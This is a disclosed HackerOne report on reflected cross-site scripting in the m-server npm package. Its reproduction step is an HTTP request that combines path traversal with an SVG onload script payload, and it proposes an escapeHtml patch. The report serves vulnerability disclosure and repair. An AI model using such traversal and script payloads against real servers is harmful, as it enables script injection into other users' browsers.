---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '951468'
original_report_id: '951468'
title: '[m-server] XSS reflected because path does not escapeHtml'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: nodejs-ecosystem
created_at: '2020-08-05T08:11:07.446Z'
disclosed_at: '2020-09-28T02:26:55.585Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 12
asset_identifier: m-server
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [m-server] XSS reflected because path does not escapeHtml

## Metadata

- HackerOne Report ID: 951468
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: nodejs-ecosystem
- Disclosed At: 2020-09-28T02:26:55.585Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report XSS in m-server
It allows attacker can perform XSS in client side

# Module

**module name:** m-server
**version:** 1.4.2
**npm page:** `https://www.npmjs.com/package/m-server`

## Module Description
M-Server is a mini http static server that without any dependencies;


## Module Stats
[1] weekly downloads
150

# Vulnerability
XSS reflected because path does not escapeHtml

## Vulnerability Description
in `m-server/lib/utils.js` line 59 and 64, html push does not escapeHtml for variable path.
{F936938}

By change path of URL via traversal, attacker can control this variable `path`.
{F936939}

## Steps To Reproduce:
On server, run this:
$ cd /home/vagrant/tmp/test
$ m-server
On client, issue requests:
```
GET /../../../../home/vagrant/tmp/test/<svg/onload=alert(document.domain)>/../../../test/ HTTP/1.1
Host: 192.168.57.105:3001
User-Agent: curl/7.54.0
Accept: */*
Connection: close
```
POC:
{F936947}

## Patch
line 59 should use 
```
html.push('<li><a href="' + escapeHtml(path) + '/' + escapeHtml(val) + '">' + escapeHtml(val) + '</a></li>');
```
line 64 should use 
```
html.push('<li><a download href="' + escapeHtml(path) + '/' + escapeHtml(val) + '">' + escapeHtml(val) + '</a></li>');
```
Or strip path traversal

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- [OPERATING SYSTEM VERSION]
- [NODEJS VERSION]
- [NPM VERSION]
- [BROWSERS VERSIONS, IF APPLICABLE] 
- [OTHER SOFTWARE USED TO EXPLOIT VULNERABILITY AND THEIR VERSIONS, IF APPLICABLE]

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] N
- I opened an issue in the related repository: [Y/N] N

> Hunter's comments and funny memes goes here

## Impact

XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
